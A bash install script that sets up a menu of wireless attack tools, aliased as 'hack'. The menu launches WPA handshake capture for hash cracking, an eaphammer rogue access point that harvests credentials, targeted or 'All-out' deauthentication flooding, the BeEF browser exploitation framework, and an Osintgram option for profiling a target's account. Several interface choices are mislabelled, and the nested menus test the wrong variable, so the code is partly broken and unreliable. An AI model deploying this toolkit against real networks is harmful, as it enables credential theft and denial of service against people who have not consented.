#begins installing prereqs and packages

sudo apt-get update && sudo apt-get upgrade -y
sudo apt-get install git -y
sudo apt-get install pip -y
sudo apt-get install python3*-venv -y
sudo apt-get install wifite -y 
sudo apt-get install hcxdumptool -y
sudo apt-get install hcxtools -y
sudo apt-get install macchanger -y
sudo apt-get install nmap -y
sudo apt-get install screen -y
sudo apt-get install cmatrix -y
sudo apt-get install libnl-3-dev libnl-genl-3-dev -y
sudo apt-get install pcap* -y
sudo apt-get install scapy -y
sudo pip3 install pem --break-system-packages
sudo pip3 install pyOpenSSL --break-system-packages
sudo pip install tqdm --break-system-packages
sudo pip3 install flask --break-system-packages
sudo pip3 install flask_cors --break-system-packages
sudo pip3 install flask_socketio --break-system-packages
sudo pip3 install pywebcopy --break-system-packages
sudo pip3 install bs4 --break-system-packages


echo "-------------------Cloning eaphammer-------------------"
git clone https://github.com/s0lst1c3/eaphammer.git
clear

echo "---------------Cloning Deauthenticator---------------"
git clone https://github.com/flashnuke/wifi-deauth
clear

echo "-------------------Cloning BeEF-------------------"
git clone https://github.com/beefproject/beef.git
clear

echo "-------------------Installing Eaphammer-------------------"
sudo ./eap*/raspbian-setup
clear

echo "-------------------Installing BeEF-------------------"
cd beef
sudo ./install
sudo bundle install

python3 -m venv venv

source venv/bin/activate


#fetches current working directory and stores as variable
currentDir=$(pwd)
hereIam="$currentDir/gemini.sh"

#creates an executable script for the hack selection menu
echo 'Creating Selection Menu'

cat > gemini.sh <<'endmsg'
#!/bin/bash

# Define unique names for each option
OPTION_1="HCXDumpTool"
OPTION_2="Eaphammer"
OPTION_3="Wifite"
OPTION_4="FlashNuke's DeAuth"
OPTION_5="BeEF"
#OPTION_6="Osintgram"
OPTION_7="Matrix"
OPTION_8="Quit"
SUBOPTION_1="wlan0"
SUBOPTION_2="wlan1"
SUBOPTION_3="wlan2"
subOptDeauth_1="Targetted"
subOptDeauth_2="All-out attack!"

# Function to display the menu
function show_menu {
    while true; do
        clear # Clears display before showing options
        
        options=("$OPTION_1" "$OPTION_2" "$OPTION_3" "$OPTION_4" "$OPTION_5" "$OPTION_6" "$OPTION_7" "$OPTION_8") # Array of options
        subOptions=("$SUBOPTION_1" "$SUBOPTION_2" "$SUBOPTION_3") # Fixed spacing
        subOptDeauth=("$subOptDeauth_1" "$subOptDeauth_2")
        
        
        PS3='Please enter your choice: '
        select opt in "${options[@]}"; do
            case $opt in
                "$OPTION_1") #Begins attempting HCXDumptool attack
                    echo "You chose HCXDumpTool"
                    echo "Please select a wireless device"
                    select subOpt in "${subOptions[@]}"; do
                        case $subOpt in #asks for which wireless device to attack on
                            "$SUBOPTION_1")
                                echo "You chose wlan1"
                                read -p "Please press enter to begin"
                                sudo hcxdumptool -i wlan0 -w hcxdumpfile.pcapng -f rds=1
                                ;;
                            "$SUBOPTION_2")
                                echo "You chose wlan2"
                                read -p "Please press enter to begin"
                                sudo hcxdumptool -i wlan1 -w hcxdumpfile.pcapng -f rds=1
                                ;;
                            "$SUBOPTION_3")
                                echo "You chose wlan3"
                                read -p "Please press enter to begin"
                                sudo hcxdumptool -i wlan1 -w hcxdumpfile.pcapng -f rds=1
                                ;;
                                *)
                                echo "Invalid option $REPLY"
                                continue
                                ;;
                        esac  # After processing subOptions, break the inner select loop
                        
                        clear
                        echo "Creating hashcat file and SSID list"
                        sudo hcxpcapngtool -o hash.hc22000 -E essidlist hcxdumpfile.pcapng #saves files to launch directory
                        read -p "Press enter to finish"
                        clear
                        break
                    done
                    ;;
                "$OPTION_2")
                    echo "You chose Eaphammer"
                      echo "Please select a wireless device"
                    select subOpt in "${subOptions[@]}"; do
                        case $subOpt in
                            "$SUBOPTION_1")
                                echo "You chose wlan0"
                                read -p "Please enter WiFi connection name:" wifiName
                                read -p "Please press enter to begin"
                                sudo ./eaphammer/eaphammer -i wlan1 --channel 4 --auth wpa-eap --essid "$wifiName" --creds
                                ;;
                            "$SUBOPTION_2")
                                echo "You chose wlan1"
                                read -p "Please enter WiFi connection name:" wifiName
                                read -p "Please press enter to begin"
                                sudo ./eaphammer/eaphammer -i wlan2 --channel 4 --auth wpa-eap --essid "$wifiName" --creds
                                ;;
                            "$SUBOPTION_3")
                                echo "You chose wlan2"
                                read -p "Please enter WiFi connection name:" wifiName
                                read -p "Please press enter to begin"
                                sudo ./eaphammer/eaphammer -i wlan3 --channel 4 --auth wpa-eap --essid "$wifiName" --creds
                                ;;  
                            *)
                                echo "Invalid option $REPLY"
                                continue
                                ;;
                         esac
                        break
                    done
                    ;;

                "$OPTION_3")
                    echo "You chose Wifite"
                    read -p "Please press enter to begin"
                    sudo wifite
        	    ;;
        	"$OPTION_4")
                    echo "You chose FlashNuke's DeAuth"
                      echo "Please choose an attack type"
                    select subOpt in "${subOptDeauth[@]}"; do
                        case $subOpt in
                            "$subOptDeauth_1")
                                echo "Targetted"
                                read -p "Please enter target mac address:" target
                                if [ -z "$target" ]; then
                                    echo "No mac address provided. Returning to main menu."
                                    break
                                fi
                                echo "Please select a wireless interface to attack on:"
                                	select subOpt in "${subOptions[@]}"; do
                        			case $subOptions in
                            			"$SUBOPTION_1")
                               				echo "You chose wlan1"
                                			read -p "Please press enter to begin"
                                			sudo python3 ./wifi-deauth/wifi_deauth/wifi_deauth.py -i wlan0 --deauth-all-channels --bssid "$target"
                                			;;
                            			"$SUBOPTION_2")
                                			echo "You chose wlan2"
                                			read -p "Please press enter to begin"
                                			sudo python3 ./wifi-deauth/wifi_deauth/wifi_deauth.py -i wlan1 --deauth-all-channels --bssid "$target"
                                			;;
                            			"$SUBOPTION_3")
                                			echo "You chose wlan3"
                                			read -p "Please press enter to begin"
                                			sudo python3 ./wifi-deauth/wifi_deauth/wifi_deauth.py -i wlan2 --deauth-all-channels --bssid "$target"
                                			;;  
                            			*)
                                			echo "Invalid option $REPLY"
                                			continue
                                			;;   
                                			esac
                                			break
                                			done
                                			;;
                            "$subOptDeauth_2")
                                echo "All-out attack!"
                                read -p "Please select a wireless interface to attack on"
                                	select subOpt in "${subOptions[@]}"; do
                        			case $subOptions in
                            			"$SUBOPTION_1")
                               				echo "You chose wlan0"
                                			read -p "Please press enter to begin"
                                			sudo python3 ./wifi-deauth/wifi_deauth/wifi_deauth.py -i wlan0 --deauth-all-channels
                                			;;
                            			"$SUBOPTION_2")
                                			echo "You chose wlan1"
                                			read -p "Please press enter to begin"
                                			sudo python3 ./wifi-deauth/wifi_deauth/wifi_deauth.py -i wlan1 --deauth-all-channels
                                			;;
                            			"$SUBOPTION_3")
                                			echo "You chose wlan2"
                                			read -p "Please press enter to begin"
                                			sudo python3 ./wifi-deauth/wifi_deauth/wifi_deauth.py -i wlan2 --deauth-all-channels
                                			;;  
                            			*)
                                			echo "Invalid option $REPLY"
                                			continue
                                			;;
                                			esac
                                			break
                                			done
                                			;;
                                	esac
                                	break
                                	done
                                	;;
                "$OPTION_5")
		    echo "You chose BeEF"
                    read -p "Please press enter to begin"
                    cd beef
                    sudo ./beef
                    cd ..
                    ;;
                "$OPTION_6")
                    echo "You chose Osintgram"
                    read -p "Please enter target username:" target
                    read -p "Press enter to begin"
                    sudo python3 /Osintgram/main.py $target
                    ;;
                "$OPTION_7")
                    echo "Hackervoice: I'm in"
                    read -p "Press enter to begin"
                    cmatrix
                    ;;
                "$OPTION_8")
                    echo "Exiting..."
                    exit 0
                    ;;
                *)
                    echo "Invalid option $REPLY"
                    ;;
            esac
            # After processing main options, break the outer select loop
            break
        done
done
}

# Display the menu
show_menu
endmsg
#makes the menu file executable
sudo chmod +x gemini.sh

#sets the word "hack" as an alias to launch the script
echo 'Creating Alias "hack"'
touch $currentDir/.bash_aliases
echo 'alias hack='"$hereIam" >> $currentDir/.bash_aliases
mv .bash_aliases ~

echo 'Please Enjoy Responsibly'
echo 'Open a new terminal and type "hack" to begin.'
echo 'Press Enter to Finish...'
read return
exit
